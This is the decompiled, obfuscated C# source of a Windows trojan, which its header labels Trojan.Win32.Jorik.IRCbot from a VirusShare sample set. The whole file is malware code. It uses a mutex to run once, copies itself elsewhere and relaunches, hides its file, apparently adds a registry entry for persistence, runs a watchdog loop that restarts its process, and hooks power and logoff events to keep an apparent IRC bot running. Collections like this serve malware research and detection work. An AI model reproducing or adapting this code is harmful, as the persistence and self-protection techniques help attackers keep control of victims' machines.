// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0001;
using \u0004;
using \u000E;
using \u000F;
using Microsoft.Win32;
using SmartAssembly.MemoryManagement;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace \u0001
{
  internal sealed class \u0003
  {
    public static string \u0001;
    public static Thread \u0001;
    public static bool \u0001;
    [NonSerialized]
    internal static \u0008.\u0004 \u0015;

    public static void \u0001([In] string[] obj0)
    {
      if (true)
        MemoryManager.\u0001();
      if (obj0.Length <= 0)
      {
        try
        {
          \u000F.\u0001.\u0001 = \u007F\u0002.\u0008\u0004(\u000F.\u0001.\u0001());
          \u001F.\u0088\u0002(0);
        }
        catch
        {
          \u000F.\u0001.\u0001 = new Mutex(true, \u000F.\u0001.\u0001());
        }
        if (!\u0005.\u007E\u0081((object) \u000F.\u0001.\u0001, \u000F.\u0001.\u000E))
        {
          try
          {
            string str = \u0005\u0002.\u008C\u0003(\u000F.\u0001.\u000E, \u0003.\u0015(1966), \u0002.\u0001(8), \u0003.\u0015(1971));
            \u001F\u0002.\u0007\u0004(\u000F.\u0001.\u0001, str);
            if (\u0011\u0002.\u0094\u0003(str))
            {
              \u0013.\u007E\u0007\u0002((object) \u000F.\u0001.\u0001);
              Process process = \u001E.\u0086\u0002(str);
              \u001F.\u0088\u0002(0);
            }
          }
          catch
          {
          }
        }
        if (\u0080\u0002.\u000E\u0004(\u000F.\u0001.\u0001) != FileAttributes.Hidden)
          \u001A.\u0081\u0002(\u000F.\u0001.\u0001, FileAttributes.Hidden);
        if (global::\u000F.\u007E\u008B((object) \u0002.\u0001(), \u000F.\u0001.\u0015) == null)
          \u0010\u0002.\u007E\u0092\u0003((object) \u0002.\u0001(), \u000F.\u0001.\u0015, (object) \u000F.\u0001.\u0001);
        if (true)
        {
          Thread thread = new Thread(new ThreadStart(\u0002.\u0001));
          \u0084.\u007E\u0094\u0002((object) thread, true);
          \u0013.\u007E\u0002\u0002((object) thread);
          \u0081\u0002.\u000F\u0004(new PowerModeChangedEventHandler(\u0003.\u0001));
          \u0082\u0002.\u0010\u0004(new SessionEndingEventHandler(\u0003.\u0001));
          \u0084.\u007E\u0094\u0002((object) \u0003.\u0001, true);
          \u0013.\u007E\u0002\u0002((object) \u0003.\u0001);
        }
        else
          goto label_26;
      }
      else
        goto label_29;
label_25:
      Thread thread1 = new Thread((ThreadStart) (() => \u0002.\u0001(\u000F.\u0001.\u0001, \u000F.\u0001.\u0010, \u000F.\u0001.\u0011, \u000F.\u0001.\u0001, \u000F.\u0001.\u0014)));
label_26:
      \u0013.\u007E\u0002\u0002((object) thread1);
      return;
label_29:
      string str1 = obj0[0];
      int num1 = \u0016.\u0017\u0002(obj0[1]);
      do
      {
        try
        {
          Process process = \u0017.\u0019\u0002(num1);
        }
        catch
        {
          if (true)
          {
            if (!\u0011\u0002.\u0094\u0003(str1))
              \u001F\u0002.\u0007\u0004(\u000F.\u0001.\u0001, str1);
            Process process = new Process();
            try
            {
              \u0012.\u007E\u0091((object) \u0013\u0002.\u007E\u0096\u0003((object) process), str1);
              int num2 = \u008C.\u007E\u0007\u0003((object) process) ? 1 : 0;
              num1 = \u0019.\u007E\u001B\u0002((object) process);
            }
            finally
            {
              if (process != null)
                \u0013.\u007E\u009D((object) process);
            }
          }
        }
        if (\u0014.\u0015\u0002(global::\u0004.\u001D(\u0003.\u0001)).Length > 1)
          \u0013.\u007E\u009E((object) \u0006.\u0086());
        \u001F.\u0087\u0002(100);
      }
      while (true);
      goto label_25;
    }

    private static void \u0001([In] object obj0, [In] PowerModeChangedEventArgs obj1)
    {
      try
      {
        while (true)
        {
          if (true)
          {
            int num = (int) \u0083\u0002.\u007E\u0011\u0004((object) obj1);
            if (true)
              goto label_8;
label_3:
            PowerModes powerModes;
            if (true)
            {
              switch (powerModes)
              {
                case PowerModes.Resume:
                  goto label_4;
                case PowerModes.Suspend:
                  goto label_5;
                default:
                  goto label_7;
              }
            }
            else
              continue;
label_8:
            powerModes = (PowerModes) num;
            goto label_3;
          }
label_5:
          \u0002.\u0002(\u0003.\u0015(2873));
          break;
        }
        goto label_7;
label_4:
        \u0002.\u0001(\u000F.\u0001.\u0001, \u000F.\u0001.\u0010, \u000F.\u0001.\u0011, \u000F.\u0001.\u0001, \u000F.\u0001.\u0014);
        if (false)
          ;
label_7:
        if (false)
          goto label_4;
      }
      catch
      {
      }
    }

    private static void \u0001([In] object obj0, [In] SessionEndingEventArgs obj1)
    {
      try
      {
        SessionEndReasons sessionEndReasons = \u0084\u0002.\u007E\u0012\u0004((object) obj1);
        if (false)
          return;
        switch (sessionEndReasons)
        {
          case SessionEndReasons.Logoff:
            \u0002.\u0002(\u0003.\u0015(2914));
            break;
          case SessionEndReasons.SystemShutdown:
            \u0002.\u0002(\u0003.\u0015(2951));
            break;
        }
      }
      catch
      {
      }
    }

    private static void \u0001()
    {
      try
      {
        if (\u0011\u0002.\u0094\u0003(\u0003.\u0001))
        {
          \u001A.\u0081\u0002(\u0003.\u0001, FileAttributes.Hidden);
          Process process = new Process();
          try
          {
            \u0012 obj = \u0012.\u007E\u0091;
            ProcessStartInfo processStartInfo = \u0013\u0002.\u007E\u0096\u0003((object) process);
            string str = \u0003.\u0001;
            if (true)
              goto label_6;
label_3:
            \u0012.\u007E\u0090((object) \u0013\u0002.\u007E\u0096\u0003((object) process), \u0083.\u0093\u0002((object) \u000F.\u0001.\u0001, (object) \u0003.\u0015(585), (object) \u0019.\u007E\u001B\u0002((object) \u0006.\u0086())));
            int num = \u008C.\u007E\u0007\u0003((object) process) ? 1 : 0;
            \u0013.\u007E\u009F((object) process);
            if (\u0014.\u0015\u0002(global::\u0004.\u001D(\u0003.\u0001)).Length > 1)
              return;
            \u0003.\u0001();
            return;
label_6:
            obj((object) processStartInfo, str);
            goto label_3;
          }
          finally
          {
            if (process != null)
              \u0013.\u007E\u009D((object) process);
          }
        }
        else
        {
          \u001F\u0002.\u0007\u0004(\u000F.\u0001.\u0001, \u0003.\u0001);
          \u0003.\u0001();
        }
      }
      catch
      {
      }
    }

    static \u0003()
    {
      \u0005.\u0001(typeof (\u0003));
      bool flag = false;
      Assembly assembly = \u007F.\u0089\u0002();
      if (!\u0003.\u0001(\u0003.\u007E\u0006((object) assembly), true, out flag) || !flag || !\u0005.\u007E\u0082((object) \u0003.\u007E\u0007((object) assembly), \u0003.\u0015(673)))
        throw new SecurityException(\u0003.\u0015(698));
      \u0003.\u0001 = \u0005\u0002.\u008C\u0003(global::\u0004.\u001C(\u0003.\u0015(2988)), \u0003.\u0015(1966), \u0003.\u007E\u000E((object) \u001D.\u007E\u0084\u0002((object) \u000F.\u0001.\u0001(), 0, 7)), \u0003.\u0015(1971));
      \u0003.\u0001 = new Thread(new ThreadStart(\u0003.\u0001));
      \u0003.\u0001 = true;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
